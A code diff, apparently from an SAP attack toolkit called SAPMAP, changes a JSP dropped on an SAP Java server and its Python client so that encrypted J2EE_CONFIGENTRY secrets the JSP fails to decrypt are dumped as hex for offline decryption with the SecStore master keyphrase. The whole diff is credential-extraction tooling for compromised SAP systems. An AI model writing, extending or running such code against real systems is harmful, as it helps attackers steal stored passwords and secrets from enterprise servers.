@@ -228,9 +228,25 @@ try {
                         // skipped without polluting the entries list.
                         Throwable rc = dt;
                         while (rc.getCause() != null) rc = rc.getCause();
+                        // Emit the raw VBYTES hex too so SAPMAP's offline
+                        // decrypt path (sap_java_secstore_offline) can
+                        // retry with the master keyphrase pulled directly
+                        // from SecStore.key.  ERPScan's 2018 research
+                        // confirmed the same keyphrase decrypts both the
+                        // filesystem SecStore AND J2EE_CONFIGENTRY VBYTES;
+                        // our JSP-side decryptM apparently refuses some
+                        // rows (e.g. format-byte 0x00 cleartext) that
+                        // offline Python handles fine.
+                        StringBuilder hx = new StringBuilder(blob.length * 2);
+                        for (int i = 0; i < blob.length; i++) {
+                            int b = blob[i] & 0xff;
+                            if (b < 16) hx.append('0');
+                            hx.append(Integer.toHexString(b));
+                        }
                         out.println("# skipped cid=" + cid
                             + " name=" + name + " reason="
-                            + rc.getClass().getSimpleName());
+                            + rc.getClass().getSimpleName()
+                            + " vbytes=" + hx.toString());
                     }
                 }
                 rs.close(); ps.close();
@@ -393,16 +409,22 @@ def invoke_secstore_jsp(jsp_url: str, sid: str,
         if line.startswith("#"):
             if section == "config":
                 stripped = line.lstrip("# ").strip()
-                # "# skipped cid=X name=Y reason=Z" — decrypt failed
+                # "# skipped cid=X name=Y reason=Z vbytes=HEX" — decrypt
+                # failed.  The vbytes= field is optional (older JSPs
+                # didn't emit it) — it's what the offline decrypt path
+                # needs to retry with the master keyphrase.
                 if stripped.startswith("skipped cid="):
                     import re as _re
-                    m = _re.match(r"skipped cid=(\S+) name=(.+?) reason=(\S+)",
-                                    stripped)
+                    m = _re.match(
+                        r"skipped cid=(\S+) name=(.+?) reason=(\S+)"
+                        r"(?: vbytes=([0-9a-fA-F]+))?$",
+                        stripped)
                     if m:
                         result["failed_decrypts"].append({
                             "cid": m.group(1),
                             "name": m.group(2).strip(),
                             "reason": m.group(3),
+                            "vbytes": m.group(4) or "",
                         })
                     continue
                 # parse "# jdbc_driver=..." etc. for the jdbc_meta dict
